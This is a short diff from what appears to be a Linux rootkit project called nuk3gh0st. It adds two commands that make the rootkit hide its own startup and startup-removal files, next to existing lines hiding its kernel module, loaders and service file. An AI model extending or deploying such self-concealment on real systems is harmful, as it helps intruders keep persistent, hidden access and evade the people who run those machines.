@@ -4,5 +4,7 @@ nuk3gh0st --hide-file=rootkit.ko
 nuk3gh0st --hide-file=nuk3gh0st
 nuk3gh0st --hide-file=load-nuk3gh0st
 nuk3gh0st --hide-file=unload-nuk3gh0st
+nuk3gh0st --hide-file=startup-nuk3gh0st
+nuk3gh0st --hide-file=rmstartup-nuk3gh0st
 nuk3gh0st --hide-file=nuk3gh0st.startup
 nuk3gh0st --hide-file=nuk3gh0st.service
